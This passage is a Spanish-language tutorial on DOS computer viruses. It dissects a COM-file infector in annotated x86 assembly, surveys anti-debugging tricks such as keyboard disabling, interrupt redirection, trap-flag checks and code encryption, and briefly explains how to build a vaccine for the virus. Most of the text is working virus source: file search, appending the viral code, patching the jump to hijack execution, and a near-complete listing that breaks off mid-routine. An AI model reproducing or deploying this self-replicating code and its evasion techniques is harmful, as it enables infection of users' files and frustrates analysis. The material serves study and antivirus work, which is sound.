                JMP   ENCONTRADO          ;Brinca para verificar si se
					  ;encontró archivo
 FIND2:
                MOV   AH,4FH              ;Servicio de búsqueda de segunda
                INT   21H                 ;Coincidencia
 ENCONTRADO:
                JNC   INFECTA             ;Comienza la infección si se
encontró
                                          ;Archivo (Carry=0)
                CMP   AL,12H              ;Compara para ver si ya no hay mas
					  ;archivos
                JE    NOFILES             ;Brinca si ya no hay más archivos en
					  ;el subdirectorio
                JMP   TERMINA             ;Brinca a termina si Hay carry
 NOFILES:
                CMP   BP,0FFFFH           ;Compara BP con -1 (Bandera para
					  ;salir del ciclo)
                JNE   RAIZ                ;Brinca si no es igual
                JMP   TERMINA             ;Cuando BP=-1 Termina
 RAIZ:
                DEC   DX                  ;Pone DX en el dato para accesar
                                          ;A la Raíz en el área de datos (\)
                MOV   BP,0FFFFH           ;Mueve la Base de la Pila a -1
					  ;(Bandera)
                JMP   SHORT FIND1         ;Busca la Primera Coincidencia en 
                			  ;la raíz					  
 INFECTA:
                MOV   CX,WORD PTR DS:[BX+(OFFSET FECHA - OFFSET DTA)]
				          ;Fecha de archivo en la DTA
                AND   CX,1E0H           
                CMP   CX,1A0H             ;Verifica la fecha del archivo para
					  ;saber si se infecta o no
                JE    FIND2               ;Si no se infecta, busca otro
					  ;archivo
                CMP   WORD PTR DS:[BX+(OFFSET TAMANO - OFFSET DTA)],0FA00H        					                 
					  ;Verifica si el tamaño del archivo 
					  ;es de 64k
                JA    FIND2               ;Busca otro archivo si es >64k
              CMP     WORD PTR DS:[BX+(OFFSET TAMANO - OFFSET DTA)],100H        
		                          ;Checa el  tamaño del archivo para
					  ;saber si es mayor de 256 bytes

  3) Proceso de Infección: Para infectar un archivo, el virus  realizará  las
 siguientes tareas

  i) Obtener los atributos del archivo y cambiarlos para  asegurarse  de  que
  podrá escribirse.
  ii) Abrir el archivo para lectura/escritura.
  iii) Obtener Fecha y hora para restaurarlos después.
  iv) Leer los 3 bytes originales al inicio del programa y guardarlos
  para poder regresar el control
  v) Calcular la dirección del "nuevo salto", para tomar el control; el virus
  cambiará los 3 primeros bytes del archivo por un "JMP Virus".
  vi) Escribir el código viral anexándolo al final del programa.
  vii) Regresar la fecha original, con excepción del campo de mes.
  viii) Cerrar el archivo.
  ix) Poner atributos originales.

  MOV    AX,4300H            ;Obtiene los atributos del archivo
  INT    21H
  MOV    WORD PTR DS:[DI+(OFFSET DATRIBUTO - OFFSET DATOS)],CX
                             ;Pone en [DI+22] el atributo DIR=491H
  AND    CX,0FFFEH
  MOV    DX,DI               ;Pone DX en el área de datos
  ADD    DX,(OFFSET DATNAME - OFFSET DATOS)
                             ;Pone DX en el nombre del archivo
  MOV    AX,4301H            ;Pone los atributos de Normal CX=20H al archivo
  INT    21H

  MOV    DX,DI
  ADD    DX,(OFFSET DATNAME - OFFSET DATOS)
                             ;Pone DX en el nombre del archivo
  MOV    AX,3D02H            ;Servicio de abrir archivo para
  INT    21H                 ;Lectura/Escritura pone en AX control de archivo
  JNC    CONTINUA            ;Brinca si no hay error en la apertura del
			     ;archivo
  JMP    RESTFIN             ;Brinca si hay error (restaura atributos)


  Antes de proceder a escribir su código  en  el  archivo  huésped, el  virus
 guarda la fecha y la hora originales del archivo para  que  no  se  note  el
 cambio en estos campos, a excepción, claro está, del campo de mes.

 CONTINUA:
  MOV   BX,AX                ;Mueve el control de archivo a BX
  MOV   AX,5700H             ;Obtener fecha y hora CX=Hora, DX=Fecha
  INT   21H
  MOV   WORD PTR DS:[DI+(OFFSET DATHORA - OFFSET DATOS)],CX
                             ;Pone en [DI+24]=47FH la Hora
  MOV   WORD PTR DS:[DI+(OFFSET DATFECHA - OFFSET DATOS)],DX
                             ;Pone en [DI+26]=481H la Fecha

  Como el virus tiene el control sobre el archivo  que  infectó,  debe leer y
 guardar los 3 primeros bytes del archivo  riginal  para  poder  regresar  el
 control al programa y así se ejecute "como si nada hubiera pasado".

  MOV   AH,3FH               ;Servicio de DOS (leer archivo)
  MOV   CX,3                 ;Número de bytes por leer,BX=Control de archivo
  MOV   DX,DI                ;Lugar donde se pondrán los 3 bytes del archivo
                             ;Original y se guardaran ahí (DS:DX)
  INT   21H

  JNC   SIGUE                ;Brinca si no hay error en la lectura
  JMP   FINFEHO              ;Brinca si hay error poniendo Fecha y Hora (042C)

 SIGUE:

  CMP   AX,3                 ;Verifica si se leyeron los 3 Bytes
  JNE   FINFEHO
  MOV   AX,4202H             ;Servicio de Mover apuntador de archivo
  MOV   CX,0                 ;A partir del final, Desplazamiento CX:DX
  MOV   DX,CX                ;Devuelve en AX tamaño de archivo
  INT   21H                  ;DX:AX Nueva dir. de apuntador
  SUB   AX,3                 ;Resta 3 Bytes del Tamaño del archivo
  MOV   WORD PTR DS:[DI+4],AX
                             ;Pone en [DI+4]=45FH el tamaño del
                             ;archivo
  MOV   CX,(OFFSET DATOS-OFFSET VIRUS)
                             ;Mueve la longitud desde el principio del Virus
                             ;Hasta el área de datos (3 bytes originales)
  CMP   DX,0                 ;Verifica que DX=0 por nueva dirección de
			     ;apuntador
  JNE   FINFEHO              ;Brinca a Fin poniendo fecha y hora

  Desde aquí el virus va  a  calcular  el  lugar  donde  tiene  los  3  bytes
 originales y va a poner esa dirección en el inicio  para  poder  regresarlos
 después, porque de no hacerlo, el sistema  podría no funcionar adecuadamente
 y despertaría sospecha en el usuario.

  MOV   DX,DI                ;Pone DX la dirección de los 3 Bytes que se
			     ;leyeron
  SUB   DI,CX                ;Pone DI en el inicio del Virus
  ADD   DI,2                 ;Pone DI en la dirección donde se guardará
                             ;La dirección donde están los  3 bytes 
			     ;originales
  ADD   AX,103H              ;Tamaño del archivo(antes se le habían restado 3                                                
			     ;bytes)
                             ;+100H (Inicio de programa COM en memoria)
  ADD   AX,CX                ;AX=Dirección donde estarán los 3 Bytes
			     ;originales del archivo ya infectado

  Procede a escribir su código viral con  los  cálculos  relativos  al  nuevo
 archivo al final del mismo.

  MOV   [DI],AX              ;Pone en DI la nueva dirección de  los  3  bytes
  MOV   AH,40H               ;Servicio de escribir a archivo
  MOV   DI,DX                ;Pone DI en la dirección del área de datos
  SUB   DX,CX                ;DX=Dirección inicial del Virus (Datos por
			     ;escribir)
  MOV   CX,(OFFSET FINAL-OFFSET VIRUS)
                             ;Número de Bytes que se escribirán
  INT   21H                  ;(Tamaño del Virus)
  JNC   ESCRITO              ;Brinca si no hay error en la escritura
  JMP   FINFEHO              ;Si hay error terminar

 ESCRITO:
  CMP   AX,(OFFSET FINAL-OFFSET VIRUS) ;Verifica si se escribió completo
  JNE   FINFEHO              ;Si no se escribió completo termina
  MOV   AX,4200H             ;Mover apuntador de archivo a partir del
			     ;principio del archivo
  MOV   CX,0                 ;CX:DX Desplazamiento deseado
  MOV   DX,CX                ;0000:0000
  INT   21H
  JC    FINFEHO              ;Si hay error termina

  Sustituye los 3 primeros bytes del archivo por un salto para poder tomar el
 control al momento de que el programa es ejecutado.

  MOV   AH,40H               ;Servicio de escribir a archvio
  MOV   CX,3                 ;Número de Bytes por escribir
  MOV   DX,DI                ;Pone DX  en la dir. del área de datos
  ADD   DX,OFFSET NEWDIR - OFFSET DATOS
                             ;Pone DX en la Dir.  donde esta el nuevo salto
  INT   21H

 FINFEHO:

  MOV   CX,WORD PTR DS:[DI+ (OFFSET DATHORA - OFFSET DATOS)]
                             ;Mueve la hora del archivo a CX
  MOV   DX,WORD PTR DS:[DI+(OFFSET DATFECHA - OFFSET DATOS)]
                             ;Mueve  la fecha del archivo a DX
  AND   DX,0FE1FH            ;Pone los atributos en DX para
  OR    DX,1A0H              ;Saber que ya se infectó
  MOV   AX,5701H             ;Escribe fecha y hora al archivo
  INT   21H

  MOV   AH,3EH               ;Cerrar archivo
  INT   21H

 RESTFIN:

  MOV   AX,4301H             ;Restaura atributos de archivo
  MOV   CX,WORD PTR DS:[DI+(OFFSET DATRIBUTO - OFFSET DATOS)]    
                             ;Pone en CX atributos originales
  INT   21H

  4) Se hace un RET para pasar el control  al  programa  original, preparando
 los registros para el retorno.

  MOV   DI,100H              ;Pone DI en el inicio
  PUSH  DI                   ;Guarda un 100h en la pila
  DB    0C3H                 ;(*RET) Regresa el control al  programa 
  			     ;principal

  Técnicas Antidebug Básicas en Virus de Computadora

  Desde que  se  popularizó  el  uso  de  los  depuradores  (debuggers),  los
 programadores  de  virus  de  computadora  han  tratado  de  evitar  que sus
 creaciones sean "detectadas" con facilidad, debido a esto  han  desarrollado
 técnicas que permiten verificar, de alguna u otra forma, el uso de programas
 depuradores  para   dificultar  que  un  virus  sea  detectado  y  la  firma
 (signature) desarrollada, por lo  tanto,  garantiza  su  existencia  por  un
 periodo de tiempo más amplio.

  Antes de internarnos en las técnicas antidebug, es conveniente  conocer  un
 poco acerca de estos "programas" (virus  de computadora), a  los  que  mucha
 gente les ha dado un enfoque de temor.

  Un virus de computadora (nos  referiremos  a  los  virus  bajo  el  sistema
 operativo DOS y WINDOWS) es un programa que  contiene  en  su  estructura  2
 elementos básicos para ser considerado como tal; i) su capacidad para buscar
 un lugar dentro del sistema para alojarse en  él, esto es, determina cuál es
 la mejor forma de  reproducirse, ya  sea  infectando un archivo, una área de
 disco o bien combinando  ambas; ii) la  capacidad de infección, es decir, la
 rutina de copia, especializada tan solo  en  escribir  el código viral en el
 área seleccionada y su tamaño varía de acuerdo a la complejidad con  que  un
 virus se copia a si mismo en un archivo.

  Aunque un virus de computadora  solamente  necesita  las  2  rutinas  antes
 mencionadas,  generalmente  van  acompañadas de  una tercera para evitar ser
 detectados con facilidad  por  otros  programas  o  por  el  usuario  (desde
 eliminar accesos repetidos  al  disco hasta "transformar" su código para que
 su identificación se dificulte).

  Rutinas Antidebuggers

  Podemos dividir las rutinas Antidebug en 2 categorías (según el estudio  de
 Inbar Raz [1]) :

  a) Acciones preventivas
  b) Modificación de su propio código.

  Acciones preventivas

  El objetivo de estas rutinas es dificultar a los  debuggers  la  tecnología
 inversa (desensamble).

  Inhibir el uso del teclado : Una de las formas usuales para evitar  que  un
 virus de computadora sea fácilmente depurado es deshabilitar el  teclado por
 medio del controlador  de  interrupciones  (8259), este  circuito  integrado
 puede ser accesado por medio del puerto 21h, el bit 0 pertenece  al IRQ0, el
 bit 1 al IRQ1 hasta bit 7 para IRQ7, de aquí el IRQ1 es la  interrupción del
 teclado, que al ser deshabilitado, el teclado no responde.

  Ejemplo:

  CS:0100 E421    IN      AL,21           ;Obtener estado de IRQs
  CS:0102 0C02    OR      AL,02           ;Enciende bit de IRQ1
  CS:0104 E621    OUT     21,AL           ;Desactiva teclado

  Redirección de interrupciones: La idea en esta técnica es hacer  una  copia
 de la dirección de la int 21h (por ser la más utilizada) en  la  int 03h (se
 usa esta interrupción debido a  que  consiste  de  un  solo  byte, lo que no
 permite que sea reemplazada dentro del código)  y llamar a está última  cada
 vez que se necesite un servicio de la int 21h, es decir, en vez  de  obtener
 la versión de MS-DOS por medio de la int 21h lo hacemos llamando  a  la  int
 03h que tiene una copia de la dirección de la int 21h.

  Ejemplo :

  CS:0100 FA              CLI                 ;Limpia bandera de interrupción
  CS:0101 31C0            XOR   AX,AX         ;Poner AX=0
  CS:0103 8EC0            MOV   ES,AX         ;ES= Dirección Tabla
Interrupciones
  CS:0105 26A18400        MOV   AX,ES:[0084]  ;Desplazamiento Int 21h
  CS:0109 26A30C00        MOV   ES:[000C],AX  ;Guardala en desplazamiento Int
					      ;03
  CS:010D 26A18600        MOV   AX,ES:[0086]  ;Segmento Int 21h
  CS:0111 26A30E00        MOV   ES:[000E],AX  ;Guardala en segmento Int03
  CS:0115 B44C            MOV   AH,30         ;Servicio Obtener versión de DOS
  CS:0117 CC              INT   03            ;Int 21h por medio de int 03h

  La rutina anterior obtiene la versión de DOS  por medio de la copia  de  la
 int 21h en la int 03h, si el programa esta siendo depurado, la  int 03h será
 la que emplea el debugger, así no se podrá obtener la versión de DOS.

  Verificar tiempo de ejecución :  Consiste en verificar el tiempo  que tarda
 en ejecutarse un programa  hasta  cierto  punto, obteniendo  el  contador de
 reloj que es actualizado  por  la int 08h y verificando que no exceda cierto
 límite cuando el mismo contador es comparado más  adelante  con  el  que  se
 guardó inicialmente (En la  dirección  0040:006C  está  la  parte  baja  del
 contador del sistema, mejor conocido como TIMER COUNTER).

  Ejemplo:

 Verifica	Proc	Near
		Mov	AX,40H	;Nos colocamos en el área de datos de BIOS
		Mov	DS,AX
		Mov	Timer1,DS:[6CH]	;Cargamos el valor del timer (Parte
				        ;Baja)
		Push	DS
		Push	CS		;Movemos el valor de CS a DS por medio
                                        ;del stack
		Pop	DS		;Suponemos que el área de datos está
				        ;contenida en el mismo segmento que 
				        ;el código
		Lea	DX,Mensaje	;Se ejecuta parte del código
		Mov	AH,9
		Int	21H
		Pop	DS		;Área de datos de BIOS
		Mov	AX,DS:[6CH]	;Segundo valor del timer
		Sub	AX,Timer1	;Aqui se obtiene el valor del tiempo
				        ;de ejecución
		Cmp	AX,30H
		Ja	Reset		;Si el tiempo de ejecución es mayor a
					;30H, está probablemente siendo 
					;depurado
		Ret
Reset:
		Jmp	FFF0:F000	;Salto a la rutina de Bootstrap
Verifica		Endp

  Verificar banderas del CPU : Cuando el CPU se encuentra trabajando  en modo
 de "Single Step", en el registro  de  banderas  se  enciende  el  bit  8 que
 corresponde a la bandera de Trap  (modo "Single Step"), lo que indica que el
 programa está siendo depurado  de  alguna  u  otra  forma.  Actualmente, los
 depuradores cuidan mucho este detalle, y alteran  el  registro  de  banderas
 antes de devolver el control al programa que se está depurando, pero existen
 instrucciones que no pueden ser  ejecutadas  por  el  CPU en el modo "Single
 Step" (POP SS), lo que significa que dos instrucciones son ejecutadas por el
 CPU en vez de una; de esta manera, el debugger no puede cambiar  la  bandera
 de trap para la segunda instrucción.

Registro de Banderas:

	[Imagen: imagenes/bandera.gif]

  O = Bandera de Overflow         T = Bandera de Trap    
  D = Bandera de Dirección        S = Bandera de Signo   
  I = Bandera de Interrupción     Z = Bandera de Cero    
  A = Bandera de Carry Auxiliar   P = Bandera de Paridad
  C = Bandera de Carry

  Ejemplo :

  CS:0100 16      PUSH    SS      ;Guarda el segmento de stack en la pila
  CS:0101 17      POP     SS      ;Sácalo
  CS:0102 9C      PUSHF           ;Guarda el registro de Banderas
  CS:0103 58      POP     AX      ;Obtener el registro de banderas en AX
  CS:0104 A90001  TEST    AX,0100 ;Verificar si esta encendida la                                                                
				  ;bandera de Trap
  CS:0107 7517    JNZ     0120    ;Si Bit 4  = 1     ==>   Salir

  Detener la ejecución usando el stack : Por lo  general, cuando  un debugger
 está  depurando  un  programa, este  último  utiliza  el  área  de stack del
 programa como un stack propio, aprovechando esto, podemos intercalar nuestra
 área de stack en el código, de forma que al ejecutar el programa normalmente
 el código ejecutable no sea sobrescrito. Al  tratar  de  aplicar  tecnología
 inversa, el debugger usará esta área como  su  stack, lo que ocasiona que el
 código del programa sea sobrescrito y como consecuencia el  sistema  quedará
 bloqueado o bien será otro código el que se ejecute (los datos que  pone  el
 debugger).

  Ejemplo :

  CS:0100 8CD0    MOV             AX,SS
  CS:0102 89E3    MOV             BX,SP
  CS:0104 0E      PUSH            CS
  CS:0105 17      POP             SS
  CS:0106 BC0F01  MOV             SP,010F
  CS:0109 90      NOP             ;Esta área será sobrescrita si
  CS:010A 90      NOP             ;el programa es depurado.
  CS:010B EB02    JMP             010F ; por lo tanto este JMP no                                                                
				  ;existiría
  CS:010D 90      NOP             ;Área usada como stack                                                                         
				  ;provisional
  CS:010E 90      NOP
  CS:010F 89DC    MOV     SP,BX
  CS:0111 8ED0    MOV     SS,AX

  Modificación de Código

  Encripción : En la actualidad es  uno  de  los  recursos  principales  para
 ocultar las rutinas  antidebug,  consiste  en  "cambiar"  el  código  normal
 realizando algún tipo de operación (ADD, SUB, XOR, AND, etc.).

  Ejemplo .

  CS:0100 B409            MOV     AH,09
  CS:0102 BA0002  MOV     DX,0200
  CS:0105 CD21    INT     21
  CS:0107 B8004C  MOV     AX,4C00
  CS:010A CD21    INT     21

  Al sumar 30 hexadecimal a cada uno de los bytes que conforman  el  programa
 anterior tenemos :

  CS:0100 E439            IN              AL,39
  CS:0102 EA3032FD51      JMP             51FD:3230
  CS:0107 E8307C          CALL            7D3A
  CS:010A FD              STD
  CS:010B 51              PUSH            CX

  El cuál es muy diferente del  "código original". Utilizando  esta  sencilla
 técnica  pueden  lograrse  hasta  255 diferentes "formas de código", lo  que
 dificulta la búsqueda de una cadena apropiada para identificar un virus.

  Una rutina para encriptar puede ser de la siguiente forma:

 Encripta       Proc    Near
		Mov 	SI,OFFSET Codigo	;Codigo es el código que se
						;encriptará
		Mov	CX, Tamano		;Tamaño del código que se
						;encripta
		Mov 	DI,OFFSET Codigo	;Serán colocados en el mismo
						;lugar, solo que modificados
 Crypt:
		Lodsb				;Carga un byte
		Add	Al,30h			;Sumamos 30H a cada byte para
						;"cambiar" el código	
        	Stosb			        ;Lo ponemos en el mismo lugar
					        ;pero sumados 30H
		Loop	Crypt			;Repetimos para todos los
						;bytes
		Ret
 Encripta       Endp

  Para obtener de nueva cuenta el código "original", solamente tendremos  que
 sustituir la instrucción :
				Add	Al,30H
  
  Por su operación inversa :
				Sub	Al,30H

  Modificación del contenido de la interrupción 1 : Cuando un  debugger  pone
 al CPU en modo "Single Step" se llama a la Int 01 cada vez  que  se  ejecuta
 una instrucción, de esta manera puede ir  haciendo la depuración paso a paso
 en la ejecución; pero ¿que sucedería si obtuviéramos el lugar donde  está el
 código de esta interrupción y  fuera  modificado  para  que  no  realice  su
 trabajo  (poniendo  por  ejemplo,  un  IRET [retorno  de  interrupción])? la
 respuesta es que el modo "Single Step" que  el  debugger  desea  utilizar no
 funcionará y el programa se ejecutará como si  estuviera "corriendo normal".

  Ejemplo:

  CS:01CD 06              PUSH    ES
  CS:01CE 33ED    XOR     BP,BP
  CS:01D0 8CD1    MOV     CX,SS           ;Guarda SS en CX
  CS:01D2 FA              CLI
  CS:01D3 8E5             MOV     SS,BP   ;Pon SS = 0
  CS:01D5 C47E04  LES     DI,[BP+04]      ;Carga en ES:DI la dirección de la                                                             
					  ;rutina del vector de la int 01h 
					  ;(Single Step)
  CS:01D8 8ED1    MOV     SS,CX           ;Valor original de SS
  CS:01DA FB              STI
  CS:01DB B0CF    MOV     AL,CF           ;AL = Código hexadecimal de la                                                                 
					  ;instrucción IRET
  CS:01DD FC              CLD
  CS:01DE AA              STOSB           ;Pone en ES:DI un IRET (Pone una                                                               
					  ;instrucción  IRET en la rutina de
					  ;la Int 01)
  CS:01DF 07              POP     ES

  Programas Antivirales

  A partir de 1988 inicia una de las batallas que más adeptos ha tenido en el
 mundo de la computación, los creadores de virus contra creadores de vacunas,
 es en este año cuando las grandes empresas de hardware  y  software  se  dan
 cuenta del tremendo potencial de infección  de  los  virus (gran cantidad de
 llamadas a los servicios  técnicos  por  errores y mensajes inexplicables) y
 deciden comenzar la investigación  profunda  sobre  estas  cuestiones  (High
 Integrity Computing  Laboratory  de  IBM),  de  aquí  en  adelante  diversas
 empresas  han  desarrollado  software de protección viral que es actualizado
 periódicamente debido a la aparición de nuevos virus.

  La manera en que más comúnmente utilizada para buscar un  virus  dentro  de
 un archivo es la "búsqueda y empate  de  cadenas" que  consiste en "extraer"
 una cierta cantidad de bytes del virus que no cambian  de  una  infección  a
 otra. Ya teniendo esta cadena se inicia la comparación en cada  uno  de  los
 archivos que se quieren revisar, si en algún momento esta cadena coincide al
 100% entonces se concluye que el archivo  tiene  el virus  al que  se le  ha
 extraído la cadena.

  Para la realización de una vacuna debe hacerse un análisis previo del virus
 que se desea eliminar; sabiendo el proceso de infección podemos realizar una
 sencilla vacuna para ese virus en particular.

  Primero, sabemos que el virus  que en esta ocasión vamos a eliminar, cambia
 los 3 primeros bytes del programa huésped con un salto  al  código del virus
 para tomar el control, esto significa que el tamaño del  programa es igual a
 la dirección de inicio del  virus, así  en  este  punto  se puede truncar el
 archivo para obtener  el  tamaño  original  del  programa. Siguiendo  con el
 análisis, se puede notar que se prepara a mover 3 bytes a la dirección 100h,
 sabiendo que un programa de tipo COM inicia en la  dirección  100h, intuimos
 que esos bytes son los bytes que originalmente contenía el archivo, con esta
 información podemos construir la vacuna:

     - Tamaño original del archivo : este tamaño lo obtenemos de la dirección
 a donde será transferido el control al iniciar el  programa  porque  es  ahí
 donde el virus ha anexado su código.

     - Dirección de los 3 bytes originales : notemos que  cuando el virus  se
 prepara a mover el  código  original,  tiene  forzosamente  que,  de  alguna
 manera, apuntar al área de datos donde guardó los bytes normales del archivo
 y es aquí  donde  sabremos  en  que  parte  fueron  guardados  y  así  poder
 obtenerlos para restaurarlos y  eliminar  el  control  que  tiene  sobre  el
 archivo.

CODE_SEG_A	SEGMENT
	ASSUME  CS:CODE_SEG_A, DS:CODE_SEG_A
	ORG		100h
w13  	PROC    	FAR
start:
                JMP     VIRUS      		;Salto al inicio del Virus
                DB      497 DUP (90H)   	;Programa trampa.com (NOP)
                INT     20H                     ;Terminar programa
VIRUS:
                PUSH    AX
                MOV     SI,OFFSET DATOS         ;Dirección donde se encuentran
						;los 3 bytes originales
                MOV     DX,SI              	;Poner DX en los datos para
						;ponerlos en su lugar original
                                       		;en memoria
                CLD                            	;Limpia la bandera de
						;dirección
                MOV     DI,100H                	;Dirección donde se pondrán 
						;(Bytes Originales)
                MOV     CX,3                   	;Número de bytes que se van a
mover
                REP     MOVSB                  	;Repite mientras cx>0 Mueve
						;[si] a ES:[di]
                MOV     DI,DX                  	;Guarda la dirección donde se
						;encuentran los datos
                MOV     AX,2524H
                ADD     DX,(OFFSET INT24 - OFFSET DATOS)
                INT     21H

                MOV     DX,(OFFSET DTA-OFFSET DATOS) ;Poner DX en el area de
					        ;datos donde
                ADD     DX,DI                   ;se pondrá  el DTA
                MOV     BX,DX                   ;Guarda en BX la nueva
						;dirección del DTA (Dirección
						;de Transferencia de Disco
                MOV     AH,1AH                 	;Fijar una nueva DTA en DS:DX
                INT     21H

                MOV     BP,0                   	;Pone la Base de la pila en
SS:0000
                MOV     DX,DI                  	;Pone en DX la dirección del
						;área de datos
                ADD     DX,(OFFSET COMFILE - OFFSET DATOS)  ;Poner DX en los
						;comodines para buscar 
						;archivos
                PUSH    BX
                PUSH    DX
                POP     BX
                MOV     BYTE PTR DS:[BX],'*'
                POP     BX
FIND1:
                MOV     CX,3                    ;Atributo a usar en la
						;búsqueda
                MOV     AH,4EH              	;Servicio de Búsqueda de
						;primera
                INT     21H                     ;Coincidencia con el nombre en
DS:DX
                                                ;Y coloca la información el
DTA
                JMP     ENCONTRADO       	;Brinca para verificar si se
						;encontró archivo
FIND2:
                MOV     AH,4FH             	;Servicio de búsqueda de
						;segunda
                INT        21H			;Coincidencia
ENCONTRADO:
              JNC     INFEECTA           	;Comienza la infección si se
						;encontró
                                     		;Archivo (Carry=0)
              CMP     AL,12H            	;Compara para ver si ya no hay
						;mas archivos
              JE      NOFILES             	;Brinca si ya no hay mas
						;archivos
                                    		;En el subdirectorio
              JMP     TERMINA            	;Brinca a termina si Hay carry
NOFILES:
              CMP     BP,0FFFFH         	;Compara BP con -1 (Bandera
						;para salir del ciclo)
              JNE     RAIZ              	;Brinca si no es igual
              JMP     TERMINA           	;Cuando BP=-1 Termina
RAIZ:
              DEC     DX                  	;Pone DX en el dato para
						;accesar
                                                ;A la Raíz en
						;el  area de datos (\)
              MOV     BP,0FFFFH  	        ;Mueve la Base de la Pila a -1
(Bandera)
              JMP     SHORT FIND1      	        ;Busca la Primera Coincidencia
              					;en la Raíz
INFEECTA:
              MOV     CX,WORD PTR DS:[BX+(OFFSET FECHA - OFFSET DTA)] ;Fecha
						;de archivo en la DTA
              AND     CX,1E0H                
              CMP     CX,1A0H          	        ;Verifica la fecha del 
              					;archivo para
						;saber si se infecta o no.
              JE      FIND2             	;Si no se infecta,
						;busca otro archivo
              CMP     WORD PTR DS:[BX+(OFFSET TAMANO - OFFSET DTA)],0FA00H
						;Verifica si el tamaño del 
						;archivo es de 64k
              JA      FIND2              	;Busca otro archivo si es >64k
              CMP     WORD PTR DS:[BX+(OFFSET TAMANO - OFFSET DTA)],100H        
						;Checa el  tamaño del archivo
						;para saber si es mayor de 256 bytes
              JB      FIND2            	        ;Si el archivo es menor de 256
              					;bytes busca otro
              PUSH    DI                  	;Guarda la  dir. del área de
						;datos (DI=OFFSET DTA)
              MOV     SI,BX                     ;BX apunta a la DTA
              ADD     SI,(OFFSET NOMEXT - OFFSET DTA)   ;Pone apuntadores para
						;poder mover
              ADD     DI,(OFFSET DATNAME - OFFSET DATOS)   ;El nombre del
						;archivo de SI a				  
DI
              CMP     BP,0FFFFH       	        ;Bandera para saber si no hay
              					;mas archivos
              JNE     MUEVE              	;Brinca a mueve nombre
              MOV     AL,5CH            	;Pone el Codigo de '\' en AL
              STOSB                    	        ;Y lo Guarda en ES:[DI] para
              					;Buscar archivos en raíz
MUEVE:
              LODSB                       	;Mueve la cadena (Byte por
						;Byte) de [si] a AL
              STOSB                       	;Guarda AL en ES:[di], Mueve
						;el nombre del Archivo
                                                ;A la dirección
ES:DI
              CMP     AL,0               	;Fin del nombre de archivo
              JNE     MUEVE           	        ;Ciclo para Mover el Nombre
              					;del archivo
              POP     DI             		;Guarda la dirección final del
						;nombre
                                    		;del lugar donde se movió el
						;nombre de archivo
              PUSH    DI                 	;Pone DX en el Comienzo del 
						;area de datos
              POP     DX
              ADD     DX,(OFFSET DATNAME - OFFSET DATOS)   ;Pone DX en el
						;nombre del
              MOV     AX,4300H   		;Obtiene los atributos del archivo
              INT     21H

              MOV     WORD PTR DS:[DI+(OFFSET DATRIBUTO - OFFSET DATOS)],CX
						;Pone en [DI+22] el atributo
						;DIR=491H
              AND     CX,0FFFEH
              MOV     DX,DI            	        ;Pone DX en el area de datos
              ADD     DX,(OFFSET DATNAME - OFFSET DATOS)   ;Pone DX en el
						;nombre del 									
						;archivo
              MOV     AX,430               	;Pone los atributos de Normal
						;CX=20H al archivo
              INT     21H

              MOV     DX,DI
              ADD     DX,(OFFSET DATNAME - OFFSET DATOS)    ;Pone DX en el
						;nombre del archivo
              MOV     AX,3D02H           	;Servicio de abrir archivo
						;para
              INT     21H                	;Lectura/Escritura pone en AX
						;control de archivo
              JNC     CONTINUA                  ;Brinca si no hay error en la
              					;apertura del archivo
              JMP     RESTFIN             	;Brinca si hay error (restaura
						;atributos)

CONTINUA:
              MOV     BX,AX               	;Mueve el control de archivo a
BX
              MOV     AX,5700H             ;Obtener fecha y hora CX=Hora,
DX=Fecha
              INT     21H

              MOV     WORD PTR DS:[DI+(OFFSET DATHORA - OFFSET DATOS)],CX
					;Pone en [DI+24]=47FH la Hora
              MOV     WORD PTR DS:[DI+(OFFSET DATFECHA - OFFSET DATOS)],DX
					;Pone en [DI+26]=481H la Fecha
              MOV     AH,3FH           	;Servicio de DOS (leer archivo)
              MOV     CX,3              ;Número de bytes por
					;leer,BX=Control de archivo
              MOV     DX,DI             ;Lugar donde se pondrán en los
					;3 bytes del archivo
                                        ;Original y se
					;guardaran ah¡ (DS:DX)
              INT     21H
              JNC     SIGUE             ;Brinca si no hay error en la
					;lectura
              JMP     FINFEHO           ;Brinca si hay error poniendo
					;Fecha y Hora (042C)
SIGUE:
              CMP     AX,3              ;Verifica si se leyeron los 3
Bytes
              JNE     FINFEHO
              MOV     AX,4202H         	;Servicio de Mover apuntador de
					;archivo
              XOR     CX,CX             ;A partir del final,
Desplazamiento CX:DX
              PUSH    CX
              POP     DX                ;Devuelve en AX tamaño de
					;archivo
              INT     21H               ;DX:AX Nueva dir. de apuntador
              SUB     AX,3              ;Resta 3 Bytes del Tamaño del
					;archivo
              MOV     WORD PTR DS:[DI+4],AX      ;Pone en [DI+4]=45FH el
					;tamaño del archivo
              MOV     CX,(OFFSET DATOS-OFFSET VIRUS) ;Mueve la longitud desde
					;el principio el Virus hasta el area 
					;de datos (3 bytes originales)
              CMP     DX,0              ;Verifica que DX=0 por nueva
					;dir. de apuntador
              JNE     FINFEHO           ;Brinca a Fin poniendo fecha y
					;hora
					;Desde aquí¡ el virus va a calcular 
					;el lugar donde tiene los 3 bytes
					;originales y va a poner esa 
					;dirección en el inicio para poder
					;regresarlos después.

               MOV     DX,DI            ;Pone DX la dirección de los 3
					;Bytes que se leyeron

               PUSH    BX
               PUSH    DX
               POP     BX
               ADD     BX,(OFFSET COMFILE - OFFSET DATOS)
               MOV     BYTE PTR DS:[BX],20H
               POP     BX

               SUB     DI,CX             ;Pone DI en el inicio del
					 ;Virus
               ADD     DI,2          	 ;Pone DI en la dirección donde
					 ;se guardar
                                         ;La dirección donde
					 ;est n los  3 bytes  originales
               ADD     AX,103H         	 ;Tamaño del archivo(antes se le 
               				 ;habían restado 3 bytes)
                                         ;+100H (Inicio de programa COM en 
                                         ;memoria)
               ADD     AX,CX             ;AX=Dirección donde estar en
					 ;los 3 Bytes originales del
                                       	 ;Archivo ya  infectado
               MOV     [DI],AX         	 ;Pone en DI la nueva dirección de 
               				 ;los 3 bytes
               MOV     AH,40H            ;Servicio de escribir a
					 ;archivo
               MOV     DI,DX           	 ;Pone DI en la dirección del area de
					 ;datos
               SUB     DX,CX             ;DX=Direcci¢n inicial del
					 ;Virus (Datos por escribir)
               MOV     CX,(OFFSET FINAL-OFFSET VIRUS) ;Número de Bytes que se
					 ;escribirán
               INT     21H               ;(Tamaño del Virus)
               JNC     ESCRITO           ;Brinca si no hay error en la 
               				 ;escritura
               JMP     FINFEHO           ;Si hay error terminar
ESCRITO:
               CMP     AX,(OFFSET FINAL-OFFSET VIRUS) ;Verifica si se escribió
					 ;completo
               JNE     FINFEHO     	 ;Si no se escribió completo termina
               MOV     AX,4200H          ;Mover apuntador de archivo a partir
               				 ;del principio del archivo
